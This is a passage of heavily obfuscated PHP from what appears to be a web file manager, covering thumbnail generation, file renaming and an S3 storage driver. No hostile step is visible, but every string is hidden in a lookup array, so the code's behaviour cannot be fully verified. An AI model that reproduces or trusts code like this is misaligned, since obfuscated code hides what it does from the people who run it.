} $this->cacheMethod($ˆ°÷—„î[180], $Ö¬ÔÓÄ¦, $öû´”â); $this->cacheMethod($ˆ°÷—„î[181], $Ö¬ÔÓÄ¦, $öû´”â ? !1 : !0); if (is_array($”¿²Ì¨§)) { $this->cacheMethod($ˆ°÷—„î[182], $Ö¬ÔÓÄ¦, $”¿²Ì¨§); } } public function fileOutImage($£ ÙÆë«, $„×ÒƒŞë = 250) { $ˆ­ù¿Ä‰ =& $_SERVER[É¨™èà]; set_timeout(); if (substr($£ ÙÆë«, 0, 4) == $ˆ­ù¿Ä‰[152]) { $this->fileOutLink($£ ÙÆë«); } $Ş½Öæƒ„ = $this->info($£ ÙÆë«); $£øõÈêÊ = !1; $°îÕ×’ = isset($GLOBALS[$ˆ­ù¿Ä‰[183]]) ? $GLOBALS[$ˆ­ù¿Ä‰[183]] : array(); if ($°îÕ×’ && $°îÕ×’[$ˆ­ù¿Ä‰[184]] == $Ş½Öæƒ„[$ˆ­ù¿Ä‰[87]]) { $Ş½Öæƒ„ = $°îÕ×’; $—âÑÏş = $Ş½Öæƒ„[$ˆ­ù¿Ä‰[185]]; if ($—âÑÏş && isset($—âÑÏş[$ˆ­ù¿Ä‰[186]])) { if ($—âÑÏş[$ˆ­ù¿Ä‰[186]] <= $„×ÒƒŞë && $—âÑÏş[$ˆ­ù¿Ä‰[187]] <= $„×ÒƒŞë) { $£øõÈêÊ = !0; } } } if ($Ş½Öæƒ„[$ˆ­ù¿Ä‰[79]] <= 1024 * 50 || $£øõÈêÊ || !function_exists($ˆ­ù¿Ä‰[188]) || $Ş½Öæƒ„[$ˆ­ù¿Ä‰[169]] == $ˆ­ù¿Ä‰[189]) { return $this->fileOut($£ ÙÆë«, !1, $Ş½Öæƒ„[$ˆ­ù¿Ä‰[32]]); } $ªİ‚• = kodIO::hashPath($Ş½Öæƒ„); $ŸÌ’Ä£î = "\143\x6f\x76\145\x72\x5f{$ªİ‚•}\x5f{$„×ÒƒŞë}\x2e\x70\156\x67"; $¼Ä¦º·÷ = IO_PATH_SYSTEM_TEMP . $ˆ­ù¿Ä‰[190]; $Å¥Ë²€ï = IO::infoFullSimple($¼Ä¦º·÷); $…°ÃúÑ¿ = $Å¥Ë²€ï && is_array($Å¥Ë²€ï) ? $Å¥Ë²€ï[$ˆ­ù¿Ä‰[87]] : $ˆ­ù¿Ä‰[12]; if (!$…°ÃúÑ¿) { $…°ÃúÑ¿ = IO::mkdir($¼Ä¦º·÷); } if ($Ş½Öæƒ„[$ˆ­ù¿Ä‰[191]] == $ˆ­ù¿Ä‰[192] && isset($Ş½Öæƒ„[$ˆ­ù¿Ä‰[193]]) && $Ş½Öæƒ„[$ˆ­ù¿Ä‰[193]] == kodIO::sourceID($…°ÃúÑ¿)) { $Û«Æ“€ = $Ş½Öæƒ„[$ˆ­ù¿Ä‰[194]]; if ($„×ÒƒŞë <= 500) { $¸ŠÊ„ë = preg_replace($ˆ­ù¿Ä‰[195], $ˆ­ù¿Ä‰[196], $Ş½Öæƒ„[$ˆ­ù¿Ä‰[32]]); $Û«Æ“€ = IO::fileNameExist($…°ÃúÑ¿, $¸ŠÊ„ë); } return IO::fileOut(KodIO::make($Û«Æ“€), !1, $Ş½Öæƒ„[$ˆ­ù¿Ä‰[32]]); } $Äíã®ã = IO::fileNameExist($…°ÃúÑ¿, $ŸÌ’Ä£î); if ($Äíã®ã) { return IO::fileOut(KodIO::make($Äíã®ã), !1, $Ş½Öæƒ„[$ˆ­ù¿Ä‰[32]]); } if ($„×ÒƒŞë > 1000) { $this->makeImageCover($…°ÃúÑ¿, $£ ÙÆë«, $ŸÌ’Ä£î, $„×ÒƒŞë); $this->makeImageCover($…°ÃúÑ¿, $£ ÙÆë«, "\143\x6f\166\x65\x72\137{$ªİ‚•}\137\62\x35\x30\56\x70\156\147", 250); $Äíã®ã = IO::fileNameExist($…°ÃúÑ¿, $ŸÌ’Ä£î); if ($Äíã®ã) { return IO::fileOut(KodIO::make($Äíã®ã), !1, $Ş½Öæƒ„[$ˆ­ù¿Ä‰[32]]); } die; } if (!kodIO::allowCover($Ş½Öæƒ„)) { return $this->fileOut($£ ÙÆë«, !1, $Ş½Öæƒ„[$ˆ­ù¿Ä‰[32]]); } $ü‡ÉÓÂã = Cache::get($ŸÌ’Ä£î); if ($ü‡ÉÓÂã == $ˆ­ù¿Ä‰[197] || $ü‡ÉÓÂã == $ˆ­ù¿Ä‰[198]) { echo $ü‡ÉÓÂã; die; } Cache::set($ŸÌ’Ä£î, $ˆ­ù¿Ä‰[198], 60); $¸Ô”Áµ¦ = array($…°ÃúÑ¿, $Ş½Öæƒ„[$ˆ­ù¿Ä‰[87]], $ŸÌ’Ä£î, $„×ÒƒŞë); $ãÒÁ‰ÔÓ = $ˆ­ù¿Ä‰[199] . $Ş½Öæƒ„[$ˆ­ù¿Ä‰[79]] . $ˆ­ù¿Ä‰[200] . $ŸÌ’Ä£î . $ˆ­ù¿Ä‰[201] . $Ş½Öæƒ„[$ˆ­ù¿Ä‰[32]] . $ˆ­ù¿Ä‰[202] . $Ş½Öæƒ„[$ˆ­ù¿Ä‰[87]]; TaskQueue::add($ˆ­ù¿Ä‰[203], $¸Ô”Áµ¦, $ãÒÁ‰ÔÓ, $ŸÌ’Ä£î); } public function makeImageCover($¸ã©±í, $€“êÁº, $“ì„şúÎ, $¿¾¶òÔ…) { $‘ÉËş  =& $_SERVER[É¨™èà]; if (IO::fileNameExist($¸ã©±í, $“ì„şúÎ)) { return $‘ÉËş [204]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $’ãÆÈÖ = $this->getPathOuter($€“êÁº); $ë¢‚ú£ã = DATA_THUMB . $“ì„şúÎ; del_file($ë¢‚ú£ã); $îä”äéĞ = IO::copy($’ãÆÈÖ, TEMP_FILES, !1, $“ì„şúÎ); if (!@file_exists($îä”äéĞ)) { return $‘ÉËş [205]; } ImageThumb::createThumb($îä”äéĞ, $ë¢‚ú£ã, $¿¾¶òÔ…, $¿¾¶òÔ… * 10); if (@file_exists($ë¢‚ú£ã)) { Cache::remove($“ì„şúÎ); return IO::move($ë¢‚ú£ã, $¸ã©±í); } Cache::set($“ì„şúÎ, $‘ÉËş [197], 600); del_file($ë¢‚ú£ã); return $‘ÉËş [206] . $îä”äéĞ . $‘ÉËş [74]; } public function fileOutImageServer($¸ûÚ¤, $Ø¸•×Í = 250) { $this->fileOutImage($¸ûÚ¤, $Ø¸•×Í); } public function fileNameAuto($åˆç£ÀÜ, $Ü¤¸¤Ş‰, $˜ğ™™£ = REPEAT_RENAME, $¾‚õ¬ = false) { $ÊºêÃ© =& $_SERVER[É¨™èà]; $õÌÌ»×™ = $åˆç£ÀÜ === $ÊºêÃ©[12] ? $Ü¤¸¤Ş‰ : rtrim($åˆç£ÀÜ, $ÊºêÃ©[8]) . $ÊºêÃ©[8] . $Ü¤¸¤Ş‰; if ($˜ğ™™£ == REPEAT_REPLACE || !$this->exist($õÌÌ»×™) || $¾‚õ¬ && $˜ğ™™£ != REPEAT_RENAME_FOLDER) { return $Ü¤¸¤Ş‰; } if ($˜ğ™™£ == REPEAT_SKIP) { return !1; } $˜•ÌßÓ = $ÊºêÃ©[10] . get_path_ext($Ü¤¸¤Ş‰); $˜•ÌßÓ = $˜•ÌßÓ == $ÊºêÃ©[10] || $¾‚õ¬ ? $ÊºêÃ©[12] : $˜•ÌßÓ; $™†Ùâ · = 1; $ Ô´äÀá = substr($Ü¤¸¤Ş‰, 0, strlen($Ü¤¸¤Ş‰) - strlen($˜•ÌßÓ)); $Æé¨¼Úˆ = $ Ô´äÀá . "\x28{$™†Ùâ ·}\51{$˜•ÌßÓ}"; while ($this->exist(rtrim($åˆç£ÀÜ, $ÊºêÃ©[8]) . $ÊºêÃ©[8] . $Æé¨¼Úˆ)) { $Æé¨¼Úˆ = $ Ô´äÀá . "\x28{$™†Ùâ ·}\x29{$˜•ÌßÓ}"; $™†Ùâ ·++; } return $Æé¨¼Úˆ; } private function fileNameAutoList($Ç¸ ”», $ôÅ¾°¥¦, $å„ŒªÈ = false) { $±šº¶ÁĞ =& $_SERVER[É¨™èà]; $ì“£à­§ = $this->listPath($Ç¸ ”», !0); $ì“£à­§ = array_merge($ì“£à­§[$±šº¶ÁĞ[85]], $ì“£à­§[$±šº¶ÁĞ[86]]); $¹â ñÊ = array_to_keyvalue($ì“£à­§, $±šº¶ÁĞ[12], $±šº¶ÁĞ[32]); $ÉÔİØÖ˜ = $±šº¶ÁĞ[10] . get_path_ext($ôÅ¾°¥¦); $ÉÔİØÖ˜ = $ÉÔİØÖ˜ == $±šº¶ÁĞ[10] || $å„ŒªÈ ? $±šº¶ÁĞ[12] : $ÉÔİØÖ˜; $ıµ¥áàª = substr($ôÅ¾°¥¦, 0, strlen($ôÅ¾°¥¦) - strlen($ÉÔİØÖ˜)); $¶çß Øú = $ıµ¥áàª . "\x28\60\x29{$ÉÔİØÖ˜}"; for ($±÷Ä¯º¥ = 1; $±÷Ä¯º¥ <= count($¹â ñÊ) + 1; $±÷Ä¯º¥++) { $¶çß Øú = $ıµ¥áàª . "\x28{$±÷Ä¯º¥}\51{$ÉÔİØÖ˜}"; if (!in_array_not_case($¶çß Øú, $¹â ñÊ)) { return $¶çß Øú; } } return $¶çß Øú; } public function listAllFiles($Ç™®Ëšè, $üá¡úÙƒ) { $½‡ĞæöÑ =& $_SERVER[É¨™èà]; if (empty($üá¡úÙƒ)) { return array(); } $£¯Û«ºõ = array_keys($üá¡úÙƒ); $ú¦¥é = array(); $Ç™®Ëšè = trim($Ç™®Ëšè, $½‡ĞæöÑ[8]); foreach ($üá¡úÙƒ as $ØŠÃ¾Šƒ => $»ø˜³¯›) { $Õæ–š×µ = ltrim(substr(trim($ØŠÃ¾Šƒ, $½‡ĞæöÑ[8]), strlen($Ç™®Ëšè)), $½‡ĞæöÑ[8]); if (substr($ØŠÃ¾Šƒ, -1) == $½‡ĞæöÑ[8]) { $Õæ–š×µ = rtrim($Õæ–š×µ, $½‡ĞæöÑ[8]) . $½‡ĞæöÑ[8]; } $ú¦¥é = array_merge($ú¦¥é, $this->slicePath($Õæ–š×µ)); } $æ¼çô = array(); foreach (array_unique($ú¦¥é) as $ØĞ¯°Êª) { $»šŠ¨ÔÔ = array($½‡ĞæöÑ[87] => $this->getPathOuter($½‡ĞæöÑ[8] . $Ç™®Ëšè . $½‡ĞæöÑ[8] . $ØĞ¯°Êª), $½‡ĞæöÑ[78] => 1, $½‡ĞæöÑ[79] => 0); if (substr($ØĞ¯°Êª, -1) != $½‡ĞæöÑ[8]) { $»šŠ¨ÔÔ[$½‡ĞæöÑ[78]] = 0; $º…ıå»ê = $this->getPath($Ç™®Ëšè . $½‡ĞæöÑ[8] . $ØĞ¯°Êª); if (isset($üá¡úÙƒ[$º…ıå»ê])) { $·âÎæ‡ó = $üá¡úÙƒ[$º…ıå»ê]; if (isset($·âÎæ‡ó[$½‡ĞæöÑ[79]])) { $»šŠ¨ÔÔ[$½‡ĞæöÑ[79]] = intval($·âÎæ‡ó[$½‡ĞæöÑ[79]]); } if (isset($·âÎæ‡ó[$½‡ĞæöÑ[207]])) { $»šŠ¨ÔÔ[$½‡ĞæöÑ[88]] = intval($·âÎæ‡ó[$½‡ĞæöÑ[207]]); } } } $æ¼çô[] = $»šŠ¨ÔÔ; } return $æ¼çô; } public function slicePath($éŒ¢é€¿) { $Æµ—œ¤» =& $_SERVER[É¨™èà]; $¢Ü£ú = explode($Æµ—œ¤»[8], trim($éŒ¢é€¿, $Æµ—œ¤»[8])); $Ì©Ÿ›—‹ = 0; do { ++$Ì©Ÿ›—‹; $¨²ÁçñÜ[] = implode($Æµ—œ¤»[8], array_slice($¢Ü£ú, 0, $Ì©Ÿ›—‹)) . $Æµ—œ¤»[8]; } while ($Ì©Ÿ›—‹ < count($¢Ü£ú)); $¨²ÁçñÜ[count($¢Ü£ú) - 1] = $éŒ¢é€¿; return $¨²ÁçñÜ; } public function getHost() { $ëı»‡Ü½ =& $_SERVER[É¨™èà]; $‹ß®‹í· = parse_url(trim($this->domain, $ëı»‡Ü½[8])); $ñËùïÁ = isset($‹ß®‹í·[$ëı»‡Ü½[208]]) ? $‹ß®‹í·[$ëı»‡Ü½[208]] : http_type(); $ÎÉØñ— = isset($‹ß®‹í·[$ëı»‡Ü½[209]]) ? $‹ß®‹í·[$ëı»‡Ü½[209]] : $‹ß®‹í·[$ëı»‡Ü½[87]]; if (isset($‹ß®‹í·[$ëı»‡Ü½[210]])) { $ÎÉØñ— .= $ëı»‡Ü½[4] . $‹ß®‹í·[$ëı»‡Ü½[210]]; } return $ñËùïÁ . $ëı»‡Ü½[211] . $ÎÉØñ—; } public function pathEncode($¼ÓºÆÅ) { $‚‚œ·Á =& $_SERVER[É¨™èà]; return str_replace($‚‚œ·Á[212], $‚‚œ·Á[8], rawurlencode($¼ÓºÆÅ)); } public function writeLog($Õ®Êø«ö = '', $ßÛò¡¦ = false) { $ŸıÕÁ¯Ú =& $_SERVER[É¨™èà]; $øÙ×ÍÒ = in_array(ACTION, array($ŸıÕÁ¯Ú[213], $ŸıÕÁ¯Ú[214])); if (!$øÙ×ÍÒ && !GLOBAL_DEBUG) { return; } $Ä¬î¼ÁÊ = $Õ®Êø«ö; static $´öŸˆÇŠ = null; if (!$´öŸˆÇŠ) { $´öŸˆÇŠ = strtoupper($this->getType()); } $Õ®Êø«ö = $´öŸˆÇŠ . $ŸıÕÁ¯Ú[215] . $Õ®Êø«ö; if ($ßÛò¡¦) { $ó–ô§×š = error_get_last(); if ($ó–ô§×š) { $Õ®Êø«ö = array($Õ®Êø«ö, $ó–ô§×š); } } write_log($Õ®Êø«ö, $ŸıÕÁ¯Ú[216]); if ($øÙ×ÍÒ) { throw new Exception($Ä¬î¼ÁÊ); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($¾”à½Å„) { set_timeout(); require_once SDK_DIR . $_SERVER[É¨™èà][217]; parent::__construct(); $this->_init($¾”à½Å„); } public function _init($Òçôí¹) { $œÖÉ»Ü» =& $_SERVER[É¨™èà]; $this->config = $Òçôí¹; foreach ($Òçôí¹ as $‡ÍÙŠ§€ => $°„ì¯‘†) { if (isset($this->{$‡ÍÙŠ§€})) { $this->{$‡ÍÙŠ§€} = $°„ì¯‘†; } } $this->endpoint = $Òçôí¹[$œÖÉ»Ü»[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $öÜÅüœ­ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($öÜÅüœ­, 0, 7) == $œÖÉ»Ü»[219]) { $öÜÅüœ­ = $œÖÉ»Ü»[220] . substr($öÜÅüœ­, 7); } $this->client->setEndpoint($öÜÅüœ­); if (in_array(ACTION, array($œÖÉ»Ü»[213], $œÖÉ»Ü»[214]))) { $this->client->setExceptions(); } } public function setSignVersion($é†éØç = "\166\64") { $this->signVer = $é†éØç; $this->client->setSignVersion($é†éØç); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $³­§Ó´Á) { return null; } } public function isBucketCors() { $ÈŸ˜ÉÎ• =& $_SERVER[É¨™èà]; $ÁÁ”±ş± = $this->getBucketCors(); if (!$ÁÁ”±ş± || !is_array($ÁÁ”±ş±)) { return !1; } if (!is_array($ÁÁ”±ş±[$ÈŸ˜ÉÎ•[221]])) { $ÁÁ”±ş±[$ÈŸ˜ÉÎ•[221]] = explode($ÈŸ˜ÉÎ•[50], $ÁÁ”±ş±[$ÈŸ˜ÉÎ•[221]]); } if ($ÁÁ”±ş±[$ÈŸ˜ÉÎ•[222]] != $ÈŸ˜ÉÎ•[223] || !in_array($ÈŸ˜ÉÎ•[223], $ÁÁ”±ş±[$ÈŸ˜ÉÎ•[221]])) { return !1; } $‰ëÁúˆ = array_map($ÈŸ˜ÉÎ•[224], $ÁÁ”±ş±[$ÈŸ˜ÉÎ•[225]]); if (!is_array($‰ëÁúˆ)) { $‰ëÁúˆ = array(); } $äè÷— = array($ÈŸ˜ÉÎ•[226], $ÈŸ˜ÉÎ•[227], $ÈŸ˜ÉÎ•[228], $ÈŸ˜ÉÎ•[229], $ÈŸ˜ÉÎ•[230]); $×à»ÆÜÜ = array_diff($äè÷—, $‰ëÁúˆ); return empty($×à»ÆÜÜ); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($¹ı†²úò, $êÌáıèé = '', $Ÿ¶ÏŞ¤ç = REPEAT_RENAME) { $›ÀéÒ²Á = $this->setContent($¹ı†²úò, $êÌáıèé); if ($›ÀéÒ²Á !== !1) { return $this->getPathOuter($¹ı†²úò); } return !1; } public function mkdir($„ÔìşÇÊ, $Ñºú»¤ = REPEAT_SKIP) { $óÔ½ó‡ß =& $_SERVER[É¨™èà]; if (empty($„ÔìşÇÊ) && $„ÔìşÇÊ !== $óÔ½ó‡ß[231]) { return !1; } if ($Ñºú»¤ && $this->_isFolder($„ÔìşÇÊ)) { return $this->getPathOuter($„ÔìşÇÊ); } $æÊ®…³ˆ = $this->setContent($„ÔìşÇÊ, $óÔ½ó‡ß[12], !0); if ($æÊ®…³ˆ !== !1) { return $this->getPathOuter($„ÔìşÇÊ); } return !1; } public function copyFile($æƒäêÓÒ, $Ç¢ŠåÑ, $íş®³á‰ = array()) { $È‚‹ê” =& $_SERVER[É¨™èà]; $ú°ùÚî÷ = $this->objectMeta($æƒäêÓÒ); if (!$ú°ùÚî÷) { return !1; } if ($ú°ùÚî÷[$È‚‹ê”[79]] <= 1024 * 1024 * 200) { $¶ı¬¢ç = $this->client->copyObject($this->bucket, $æƒäêÓÒ, $this->bucket, $Ç¢ŠåÑ, $È‚‹ê”[232], $íş®³á‰); } else { $¶ı¬¢ç = $this->client->multiCopyObject($this->bucket, $æƒäêÓÒ, $this->bucket, $Ç¢ŠåÑ, $íş®³á‰); } $¶ı¬¢ç = $¶ı¬¢ç ? $this->getPathOuter($Ç¢ŠåÑ) : !1; return $¶ı¬¢ç; } public function moveFile($×š¹º¶, $Ş¶Ç°Åğ) { if ($this->copyFile($×š¹º¶, $Ş¶Ç°Åğ)) { $this->delFile($×š¹º¶); return $this->getPathOuter($Ş¶Ç°Åğ); } return !1; } public function delFile($œü”™‘¥) { return $this->client->deleteObject($this->bucket, $œü”™‘¥); } public function delFolder($€ÜëÒ½ø) { $ÚÂçõ =& $_SERVER[É¨™èà]; if (!$this->exist($€ÜëÒ½ø)) { return !0; } $this->listItemCache = !1; $»Ä®Ã = $this->fileList($€ÜëÒ½ø); $this->listItemCache = !0; $ù¢·„¡µ = trim($€ÜëÒ½ø, $ÚÂçõ[8]) . $ÚÂçõ[8]; if (!empty($€ÜëÒ½ø) && $€ÜëÒ½ø !== $ÚÂçõ[231] && !in_array($ù¢·„¡µ, $»Ä®Ã[$ÚÂçõ[85]])) { $»Ä®Ã[$ÚÂçõ[85]][] = $ù¢·„¡µ; } $¶—ÕÎ¾ = $this->delByBatch($»Ä®Ã[$ÚÂçõ[86]]); if (!$¶—ÕÎ¾) { return !1; } $¶—ÕÎ¾ = $this->delByBatch($»Ä®Ã[$ÚÂçõ[85]]); if (!$¶—ÕÎ¾) { return !1; } return $this->delFile($ù¢·„¡µ); } private function delByBatch($¥øğœ ) { foreach (array_chunk($¥øğœ , 1000) as $ôÀ¬õÂÅ) { $¶è¥‘İ = $this->client->deleteObjects($this->bucket, $ôÀ¬õÂÅ); if (!$¶è¥‘İ) { return !1; } } return !0; } public function rename($°¸³´º, $¸¹ –’€) { return $this->renameObject($°¸³´º, $¸¹ –’€); } public function listPath($¯ùª½£Í, $×ÄÃºÂ  = false) { $ÆŒ´ê—× =& $_SERVER[É¨™èà]; $İ–åà“Ã = $this->fileList($¯ùª½£Í, $ÆŒ´ê—×[8], !0); foreach ($İ–åà“Ã[$ÆŒ´ê—×[85]] as $öÈ‰¢‡” => $Ş‘¹¶Æ) { $İ–åà“Ã[$ÆŒ´ê—×[85]][$öÈ‰¢‡”] = $this->folderInfo($Ş‘¹¶Æ, $×ÄÃºÂ , $Ş‘¹¶Æ); } foreach ($İ–åà“Ã[$ÆŒ´ê—×[86]] as $öÈ‰¢‡” => $Ş‘¹¶Æ) { $İ–åà“Ã[$ÆŒ´ê—×[86]][$öÈ‰¢‡”] = $this->fileInfo($Ş‘¹¶Æ[$ÆŒ´ê—×[32]], $×ÄÃºÂ , $Ş‘¹¶Æ); } return $İ–åà“Ã; } protected function infoChildren($‡—¸‘ãÌ, &$š°†‡€£) { $îü§ê¿® =& $_SERVER[É¨™èà]; $ãÕ·Œ»á = $this->fileList($‡—¸‘ãÌ, $îü§ê¿®[12], !0); $š°†‡€£[$îü§ê¿®[81]] += count($ãÕ·Œ»á[$îü§ê¿®[85]]); $š°†‡€£[$îü§ê¿®[80]] += count($ãÕ·Œ»á[$îü§ê¿®[86]]); foreach ($ãÕ·Œ»á[$îü§ê¿®[86]] as $›¹Øœ¿·) { if (!$›¹Øœ¿· || !$›¹Øœ¿·[$îü§ê¿®[79]]) { continue; } $š°†‡€£[$îü§ê¿®[79]] += $›¹Øœ¿·[$îü§ê¿®[79]]; } } private function fileInfo($¢»€îĞÀ, $Æ°ƒ²¶­ = false, $ÕŞÒÑÌ„ = array()) { $¡·ò‘šø =& $_SERVER[É¨™èà]; $èôˆóµ° = array($¡·ò‘šø[32] => $this->pathThis($¢»€îĞÀ), $¡·ò‘šø[87] => $this->getPathOuter($¢»€îĞÀ), $¡·ò‘šø[33] => $¡·ò‘šø[233], $¡·ò‘šø[169] => $this->ext($¢»€îĞÀ), $¡·ò‘šø[79] => isset($ÕŞÒÑÌ„[$¡·ò‘šø[79]]) ? $ÕŞÒÑÌ„[$¡·ò‘šø[79]] : 0); if ($Æ°ƒ²¶­) { return $èôˆóµ°; } $èôˆóµ°[$¡·ò‘šø[234]] = $èôˆóµ°[$¡·ò‘šø[88]] = 0; $èôˆóµ°[$¡·ò‘šø[235]] = $èôˆóµ°[$¡·ò‘šø[236]] = !0; if (empty($ÕŞÒÑÌ„)) { $ÕŞÒÑÌ„ = $this->objectMeta($¢»€îĞÀ); if (!$ÕŞÒÑÌ„) { return $èôˆóµ°; } } if (isset($ÕŞÒÑÌ„[$¡·ò‘šø[237]]) && $ÕŞÒÑÌ„[$¡·ò‘šø[237]]) { $èôˆóµ°[$¡·ò‘šø[238]] = $ÕŞÒÑÌ„[$¡·ò‘šø[237]]; } if (isset($ÕŞÒÑÌ„[$¡·ò‘šø[207]])) { $èôˆóµ°[$¡·ò‘šø[88]] = $ÕŞÒÑÌ„[$¡·ò‘šø[207]]; } if (isset($ÕŞÒÑÌ„[$¡·ò‘šø[79]])) { $èôˆóµ°[$¡·ò‘šø[79]] = $ÕŞÒÑÌ„[$¡·ò‘šø[79]]; } return $èôˆóµ°; } private function folderInfo($ÛòÆœ„‹, $ÍüŞÍ£½ = false, $ºÊ°£™  = array()) { $ª ¬Ïæ„ =& $_SERVER[É¨™èà]; $ùÎÄ•×Á = array($ª ¬Ïæ„[32] => $this->pathThis($ÛòÆœ„‹), $ª ¬Ïæ„[87] => $this->getPathOuter($ª ¬Ïæ„[8] . $ÛòÆœ„‹), $ª ¬Ïæ„[33] => $ª ¬Ïæ„[78]); if ($ÍüŞÍ£½) { return $ùÎÄ•×Á; } $ùÎÄ•×Á[$ª ¬Ïæ„[234]] = $ùÎÄ•×Á[$ª ¬Ïæ„[88]] = 0; $ùÎÄ•×Á[$ª ¬Ïæ„[235]] = $ùÎÄ•×Á[$ª ¬Ïæ„[236]] = !0; if ($ÛòÆœ„‹ == $ª ¬Ïæ„[12]) { return $ùÎÄ•×Á; } if (empty($ºÊ°£™ )) { $ºÊ°£™  = $this->objectMeta(trim($ÛòÆœ„‹, $ª ¬Ïæ„[8]) . $ª ¬Ïæ„[8]); } if (isset($ºÊ°£™ [$ª ¬Ïæ„[207]])) { $ùÎÄ•×Á[$ª ¬Ïæ„[234]] = $ºÊ°£™ [$ª ¬Ïæ„[207]]; } return $ùÎÄ•×Á; } private function fileList($ ìÑ¡ï¶, $ôÇ«çÂú = '', $«˜Á¨¼ç = 0) { $Ä¤éíÖ  =& $_SERVER[É¨™èà]; $Ã‰©‘ì = rtrim($ ìÑ¡ï¶, $Ä¤éíÖ [8]) . $Ä¤éíÖ [8]; $ÁÃ¤¯É° = $this->listObjs($Ã‰©‘ì, null, null, $ôÇ«çÂú); if (!$ÁÃ¤¯É°) { return array($Ä¤éíÖ [85] => array(), $Ä¤éíÖ [86] => array()); } $š©Á•³ó = $Í£ûı = array(); foreach ($ÁÃ¤¯É°[$Ä¤éíÖ [239]] as $¹¿ìéÑ©) { $Úñêí¯ = $¹¿ìéÑ©[$Ä¤éíÖ [32]]; if ($Úñêí¯ == $Ã‰©‘ì) { continue; } $™¤¯ŞÆü = isset($¹¿ìéÑ©[$Ä¤éíÖ [79]]) ? $¹¿ìéÑ©[$Ä¤éíÖ [79]] : 0; $’»ÏËÈÓ = $™¤¯ŞÆü == 0 && substr($Úñêí¯, strlen($Úñêí¯) - 1, 1) == $Ä¤éíÖ [8] ? !0 : !1; $this->cacheMethodInfoSet($Úñêí¯, $’»ÏËÈÓ, $¹¿ìéÑ©); if ($’»ÏËÈÓ) { $š©Á•³ó[] = $Úñêí¯; continue; } $Í£ûı[] = $«˜Á¨¼ç ? $¹¿ìéÑ© : $Úñêí¯; } foreach ($ÁÃ¤¯É°[$Ä¤éíÖ [240]] as $¹¿ìéÑ©) { $š©Á•³ó[] = $¹¿ìéÑ©[$Ä¤éíÖ [32]]; $this->cacheMethodInfoSet($¹¿ìéÑ©[$Ä¤éíÖ [32]], !0); } $this->cacheMethodInfoSet($ ìÑ¡ï¶, !0); return array($Ä¤éíÖ [85] => $š©Á•³ó, $Ä¤éíÖ [86] => $Í£ûı); } private function listObjs($™“½Ùò, $ô•­ÌÉ“ = null, $„Ö€“§” = null, $ øµÈŠŒ = null) { $ÍÜ¡ÆÖ¹ =& $_SERVER[É¨™èà]; $™“½Ùò = trim($™“½Ùò, $ÍÜ¡ÆÖ¹[8]); $“Ô§ö÷û = empty($™“½Ùò) && $™“½Ùò !== $ÍÜ¡ÆÖ¹[231] ? $ÍÜ¡ÆÖ¹[12] : $™“½Ùò . $ÍÜ¡ÆÖ¹[8]; return $this->client->getBucket($this->bucket, $“Ô§ö÷û, $ô•­ÌÉ“, $„Ö€“§”, $ øµÈŠŒ, !0); } public function has($Ÿ‚¦¡Â, $Ó úîº = false, $üï¬Ÿ¦Ö = true) { $¯õüÌî =& $_SERVER[É¨™èà]; $Ÿ‚¦¡Â = trim($Ÿ‚¦¡Â, $¯õüÌî[8]); $ÊŒ†í·  = empty($Ÿ‚¦¡Â) && $Ÿ‚¦¡Â !== $¯õüÌî[231] ? $¯õüÌî[12] : $Ÿ‚¦¡Â . $¯õüÌî[8]; $¨÷Ã˜Î = null; $îº± »Ö = 500; $ÀÍ×¸ã = $¯õüÌî[8]; $¥”¤ˆÃ = $ÙÓû•² = array(); while (!0) { $¼¦Øˆ¬ì = $this->listObjs($Ÿ‚¦¡Â, $¨÷Ã˜Î, $îº± »Ö, $ÀÍ×¸ã); if (!$¼¦Øˆ¬ì) { break; } $¨÷Ã˜Î = $¼¦Øˆ¬ì[$¯õüÌî[241]]; $¬Áª€Èˆ = $¼¦Øˆ¬ì[$¯õüÌî[239]]; $Ò‹áÓ€ğ = $¼¦Øˆ¬ì[$¯õüÌî[240]]; if (empty($¬Áª€Èˆ) && empty($Ò‹áÓ€ğ)) { break; } if (count($¬Áª€Èˆ) == 1 && $¬Áª€Èˆ[0][$¯õüÌî[32]] == $ÊŒ†í· ) { break; } if ($Ó úîº) { if (count($¬Áª€Èˆ)) { $¬Áª€Èˆ = array_column($¬Áª€Èˆ, $¯õüÌî[32]); $¥”¤ˆÃ = array_merge($¥”¤ˆÃ, $¬Áª€Èˆ); } if (count($Ò‹áÓ€ğ)) { $Ò‹áÓ€ğ = array_column($Ò‹áÓ€ğ, $¯õüÌî[32]); $ÙÓû•² = array_merge($ÙÓû•², $Ò‹áÓ€ğ); } if ($¨÷Ã˜Î === null) { break; } continue; } if ($üï¬Ÿ¦Ö) { if (!empty($¬Áª€Èˆ)) { if (count($¬Áª€Èˆ) > 1 || isset($¬Áª€Èˆ[0][$¯õüÌî[32]]) && $¬Áª€Èˆ[0][$¯õüÌî[32]] != $ÊŒ†í· ) { return !0; } } } else { if (!empty($Ò‹áÓ€ğ)) { return !0; } } if ($¨÷Ã˜Î === null) { break; } } if ($Ó úîº) { $¥”¤ˆÃ = array_diff($¥”¤ˆÃ, array($ÊŒ†í· )); $¥”¤ˆÃ = count(array_unique($¥”¤ˆÃ)); $ÙÓû•² = count(array_unique($ÙÓû•²)); return array($¯õüÌî[242] => $¥”¤ˆÃ, $¯õüÌî[243] => $ÙÓû•²); } return !1; } public function listAll($çã“•) { $Â¢¡¡¡… =& $_SERVER[É¨™èà]; $âŞêéÅ = $this->fileList($çã“•, $Â¢¡¡¡…[12], !0); $òĞ‘Û¶¾ = array_to_keyvalue($âŞêéÅ[$Â¢¡¡¡…[86]], $Â¢¡¡¡…[32]); foreach ($âŞêéÅ[$Â¢¡¡¡…[85]] as $é“–¨•) { if (is_string($é“–¨•)) { $òĞ‘Û¶¾[$é“–¨•] = array($Â¢¡¡¡…[79] => 0); } } return 